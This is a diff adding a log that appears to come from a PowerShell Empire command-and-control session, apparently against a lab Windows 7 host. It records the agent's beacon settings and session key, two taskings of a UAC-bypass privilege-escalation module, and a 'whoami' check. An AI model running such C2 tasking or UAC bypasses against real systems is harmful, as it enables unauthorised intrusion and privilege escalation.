@@ -1,0 +1,65 @@
+
+2019-05-27 19:36:07 : 
+
+[*] Agent info:
+  nonce           	9473148317433917
+  jitter          	0.6
+  servers         	None
+  internal_ip     	192.168.153.140
+  working_hours   	
+  session_key     	@{6[_(5}BSK)!x7^0rchlWY*%P2e|M,v
+  children        	None
+  checkin_time    	2019-05-27 19:36:07
+  hostname        	WIN-JEQCV2C1G8I
+  id              	1
+  delay           	6
+  username        	WIN-JEQCV2C1G8I\User
+  kill_date       	
+  parent          	None
+  process_name    	powershell_ise
+  listener        	http
+  process_id      	3024
+  profile         	/aduin/gut.php,/nuws.php,/lugin/pruccess.php |Mozilla/5.0 (X11; Linux
+                                x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.75
+                                Safari/537.36
+  os_details      	Microsoft Windows 7 Professional
+  lost_limit      	0
+  taskings        	None
+  name            	WFBSY23V
+  language        	powershell
+  external_ip     	192.168.153.140
+  session_id      	WFBSY23V
+  lastseen_time   	2019-05-27 19:36:07
+  language_version	2
+  high_integrity  	0
+
+
+[+] Agent WFBSY23V now active:
+
+
+2019-05-27 19:45:20 : 
+Tasked agent to run module powershell/privesc/bypassuac_env
+
+2019-05-27 19:45:23 : 
+Job started: SKYFPU
+
+2019-05-27 19:46:26 : 
+[*] Agent renamed from WFBSY23V to win7
+
+2019-05-27 19:46:31 : 
+[*] Agent renamed from WFBSY23V to windows
+
+2019-05-27 19:47:40 : 
+Tasked agent to run command whoami
+
+2019-05-27 19:47:41 : 
+WIN-JEQCV2C1G8I\User
+
+2019-05-27 20:04:20 : 
+Tasked agent to run module powershell/privesc/bypassuac_env
+
+2019-05-27 20:04:26 : 
+Job started: PBG962
+
+2019-05-27 20:13:48 : 
+[!] Agent WFBSY23V exiting
